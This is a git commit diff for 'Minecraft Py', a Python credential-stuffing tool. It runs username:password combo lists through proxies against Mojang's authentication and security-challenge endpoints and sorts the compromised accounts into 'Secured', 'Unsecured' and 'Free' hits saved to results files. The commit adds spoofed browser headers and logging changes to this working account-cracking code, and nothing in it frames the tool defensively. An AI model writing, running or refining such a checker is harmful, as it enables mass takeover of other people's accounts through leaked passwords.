a60290bc5e626503bfd450b96878e7b7ca488137
Stainpy <omarashrafzaki@gmail.com>
2021-06-24 02:02:57 +0200

    Update main.py

--- main.py
+++ main.py
@@ -1,4 +1,3 @@
-#Library imports
 import requests
 from requests import Timeout
 from multiprocessing import JoinableQueue as Queue
@@ -12,14 +11,12 @@ import time
 from time import sleep
 import socks
 
-#File imports
 from static.menu import threads, timeout, proxy_type, logs, main_menu, colors
 from static.proxies import requests_proxy, load_proxy
 from static.wordlists import load_wordlist, vail_wordlists
-from static.results import results, times
+from static.results import results
 
 
-#Status
 class status:
     Hits = 0
     Free = 0
@@ -29,7 +26,6 @@ class status:
     wordlist = 0
     loaded_wordlist = 0
 
-#Checks per second
 class cpm:
     def __init__(self,start_timestamp):
         self.start_timestamp = start_timestamp
@@ -45,6 +41,20 @@ class cpm:
 global cpm_counter
 cpm_counter = cpm(int(time.time()))
 
+lock = threading.Lock()
+
+def print_logs(arg):
+    lock = threading.Lock()
+    lock.acquire()
+    print(arg)
+    lock.release()
+
+
+def clearConsole():
+    command = 'clear'
+    if os.name in ('nt', 'dos'):
+        command = 'cls'
+    os.system(command)
 
 def check_version():
     try:
@@ -64,14 +74,12 @@ def check_version():
         print("Error while checking for updates!")
 
 
-#Title bar
 def updateTitle():
     meow = int(cpm_counter.cpm())
     ctypes.windll.kernel32.SetConsoleTitleW(f"Minecraft Py v{version} | Status: {status.wordlist}/{status.loaded_wordlist} Errors/Banned: {status.errors} CPM: {meow} | Hits: {status.Hits} Unsecured: {status.Unsecured} Secured: {status.Secured} Free: {status.Free}")
     pass
 
 
-#Login Requests
 def login(q,proxies,log,proxy_type):
     while True:
         goodAttempt = False
@@ -88,7 +96,8 @@ def login(q,proxies,log,proxy_type):
 
                 url = "https://authserver.mojang.com/authenticate"
                 data ={"agent":{"name":"Minecraft", "version":1}, "username":username, "password":password, "requestUser":"true"}
-                headers = {"Content-Type":"application/json"}
+                agent = "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko"
+                headers = {"Content-Type":"application/json", "User-Agent":agent, "Pragma":"no-cache", "Accept":"*/*"}
                 failkeys = ["MethodNotAllowed","NotFound","ForbiddenOperationException","IllegalArgumentException", "IllegalArgumentException", "Unsupported MediaType"]
                 
                 if proxy != None:
@@ -97,8 +106,7 @@ def login(q,proxies,log,proxy_type):
                 rsp = ""
 
                 try:
-                    rsp = sess.post(url, json=data, headers=headers,proxies=proxy, timeout=timeout)
-                #Errors status
+                    rsp = sess.post(url, json=data, headers=headers, proxies=proxy, timeout=timeout)
                 except requests.ConnectionError:
                     status.errors += 1
                     return False
@@ -116,25 +124,26 @@ def login(q,proxies,log,proxy_type):
 
                 if any(x in rsp.text for x in failkeys):
                     if log == 1:
-                        print(colors.red + f" [Fail]: {username}:{password}")
+                        print_logs(colors.red + f" [Fail]: {username}:{password}")
                     return True
 
                 elif 'selectedProfile' not in rsp.text:
-                    print(colors.yellow + f" [Free]: {username}:{password}")
+                    print_logs(colors.yellow + f" [Free]: {username}:{password}")
                     results.Free(f"{username}:{password} | Free ")
                     status.Free += 1
-                    if status.Free == 1 and times.timestamp == None:
-                        times.timestamp                    
+                    if status.Free == 1 and results.timestamp == None:
+                        results.timestamp                    
                     updateTitle()                    
                     return True
+
                 else:
                     pass
-
+                    
                 token = data['accessToken']
                 mcusername = data['selectedProfile']['name']
 
                 url2 = "https://api.mojang.com/user/security/challenges"
-                headers2 = {"Authorization":f"Bearer {token}"}
+                headers2 = {"Content-Type":"application/json", "User-Agent":agent, "Pragma":"no-cache", "Accept":"*/*", "Authorization":f"Bearer {token}"}
 
                 try:
                     rsp2 = sess.get(url2, headers=headers2)
@@ -147,14 +156,13 @@ def login(q,proxies,log,proxy_type):
                 except:
                     status.errors += 1
                     return False
-
-
+                
                 if 'answer' in rsp2.text:
-                    print(colors.green + f" [Secured]: {username}:{password} | Username: {mcusername}")
+                    print_logs(colors.green + f" [Secured]: {username}:{password} | Username: {mcusername}")
                     results.Secured(f"{username}:{password} | Username: {mcusername} | Secured")
                     status.Secured += 1
-                    if status.Secured == 1 and times.timestamp == None:
-                        times.timestamp                    
+                    if status.Secured == 1 and results.timestamp == None:
+                        results.timestamp                    
 
                     results.Hits(f"{username}:{password} | Username: {mcusername} | Secured")
                     status.Hits += 1
@@ -163,28 +171,27 @@ def login(q,proxies,log,proxy_type):
 
                 elif 'answer' not in rsp2.text:
                     security = 'Unsecured'
-                    print(colors.cyan + f" [Unsecured]: {username}:{password} | Username: {mcusername}")
+                    print_logs(colors.cyan + f" [Unsecured]: {username}:{password} | Username: {mcusername}")
                     results.Unsecured(f"{username}:{password} | Username: {mcusername} | Unsecured")
                     status.Unsecured += 1
-                    if status.Unsecured == 1 and times.timestamp == None:
-                        times.timestamp                    
+                    if status.Unsecured == 1 and results.timestamp == None:
+                        results.timestamp                    
 
                     results.Hits(f"{username}:{password} | Username: {mcusername} | Unsecured")
                     status.Hits += 1
                     updateTitle()
                     return True
+
                 else:
                     pass
 
-
-            #Errors
             proxy = None
             if proxies:
                 proxy = random.choice(proxies)
             goodAttempt = login_function(username,password,proxy,proxy_type)
             if goodAttempt == False:
                 if log == 1:
-                    print(colors.normal + f" [Error]: {username}:{password}")
+                    print_logs(colors.normal + f" [Error]: {username}:{password}")
 
         else:
             status.wordlist +=1
@@ -192,39 +199,32 @@ def login(q,proxies,log,proxy_type):
             q.task_done()
 
 
+
 if __name__ == "__main__":
     version = '3.1'
     check_version()
     main_menu()
-
-    threads_input = threads()
-    timeout = timeout()
+    
     proxy_type = proxy_type()
+    timeout = timeout()
+    threads_input = threads()
     log = logs()
+
     worldist_array = load_wordlist()
     status.loaded_wordlist = len(worldist_array)
     q = vail_wordlists(worldist_array)
     proxies = load_proxy()
 
+    time.sleep(1)
 
-    #Threads
+    clearConsole()
+
     for i in range(threads_input):
-        worker = Thread(target=login, args=(q,proxies,log,proxy_type))
+        worker = Thread(target=login, args=(q, proxies, log, proxy_type))
         worker.setDaemon(True)
         worker.start()
 
-
-    #To join the queue thread until it's empty
     q.join()
 
-    #Final results
-    print(colors.normal,f"""
-  Checking Done.
 
-  Hits: {status.Hits}
-  Secured: {status.Secured}
-  Unsecured: {status.Unsecured}
-  Free: {status.Free}
-""")
-
-input("")
+os.system('pause>nul')
